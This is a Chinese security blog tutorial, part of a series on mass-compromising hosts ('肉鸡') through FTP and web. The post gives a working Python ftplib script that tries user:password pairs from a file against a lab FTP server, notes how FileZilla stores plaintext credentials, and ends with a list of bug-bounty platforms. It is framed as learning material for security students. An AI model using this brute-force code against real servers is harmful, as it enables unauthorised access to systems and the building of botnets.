# 原创
：  【Python脚本进阶】2.3、利用FTP与Web批量抓“ 肉机”(中)：使用Ftplib暴力破解FTP用户口令

# 【Python脚本进阶】2.3、利用FTP与Web批量抓“ 肉机”(中)：使用Ftplib暴力破解FTP用户口令

 <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）使用Ftplib暴力破解FTP用户口令（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|抓肉鸡博文|目标|状态
|[【Python脚本进阶】利用FTP与Web批量抓“ 肉机”(上)：构建匿名FTP扫描器](https://blog.csdn.net/qq_53079406/article/details/126052839)|构建匿名FTP扫描器|已发布
|[【Python脚本进阶】2.3、利用FTP与Web批量抓“ 肉机”(中)：使用Ftplib暴力破解FTP用户口令](https://blog.csdn.net/qq_53079406/article/details/126053636)|使用Ftplib暴力破解FTP用户口令|已发布
|[【Python脚本进阶】2.3、利用FTP与Web批量抓“ 肉机”(下)：在FTP服务器上搜索网页+注入代码](https://blog.csdn.net/qq_53079406/article/details/126060388)|在FTP服务器上搜索网页+注入代码|已发布
|[【Python脚本进阶】2.3、利用FTP与Web批量抓“ 肉机”(终）](https://blog.csdn.net/qq_53079406/article/details/126076401)|利用FTP与Web批量抓肉机|已发布
</tbody></table>



---


**目录**

[一、简介](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B)

[1.1、概述：](#1.1%E3%80%81%E6%A6%82%E8%BF%B0%EF%BC%9A)

[二、实现：](#%E4%BA%8C%E3%80%81%E5%AE%9E%E7%8E%B0%EF%BC%9A)

[2.1、背景：](#2.1%E3%80%81%E8%83%8C%E6%99%AF%EF%BC%9A)

[2.2、函数：](#2.2%E3%80%81%E5%87%BD%E6%95%B0%EF%BC%9A)

[2.3、步骤：](#2.3%E3%80%81%E6%AD%A5%E9%AA%A4%EF%BC%9A)

---


## 一、简介

> 
<h3>1.1、概述：</h3>
虽然匿名访问是进入系统的方式之一， 但攻击者也能成功地用偷来的用户名／密码访问合法的FTP 服务器。FileZilla 之类的FTP 客户端程序往往将密码以明文形式存储在配置文件中。在默认位置中存储明文密码使得专门为此编写的恶意软件能够迅速窃取用户名／密码。
<hr/>
安全专家们在发现的恶意软件中也发现了窃取FTP 密码的功能。一个名为get_filezilla creds.rb 的脚本也集成在了发布的Metasploit 中， 允许用户在获得目标控制权后可以快速寻找FTP 密码。


---


---


## 二、实现：

> 
<h3>2.1、背景：</h3>
假设要暴力破解的某个用户名／密码对就在一个文本文件里的纯文本文件中中
格式为：
（1.txt）
administrator:password<br/> admin:12345<br/> root:secret<br/> guest:guest<br/> root:toor


> 
<h3>2.2、函数：</h3>
ftplib.FTP类：实现FTP协议的客户端，可以使用它来编写执行各种FTP作业的Python程序


> 
<h3>2.3、步骤：</h3>
将anonLogin()函数扩展创建成一个名为bruteLogin(）的函数。这个函数接收的参数是主机名和含有密码的文件， 返回一个能登录该主机的用户名／密码。该函数逐个读取文件中的每一行记录， 用户名和密码之间是以冒号分隔的。然后函数尝试用这个用户名和密码登录FTP 服务器。
<hr/>
如果成功， 则返回一个用户名和密码的tuple。如果失败， 它跳过该异常继续到下一行。如果函数穷尽所有的行仍未能成功登录， 则返回一个值为None、None的tuple 。


<pre><code>import ftplib


def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: ' + userName + '/' + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + userName + '/' + passWord)
            ftp.quit()
            return (userName, passWord)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials')
    return (None, None)


host = '192.168.190.131'
passwdFile ='1.txt'
bruteLogin(host, passwdFile)
</code></pre>


---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

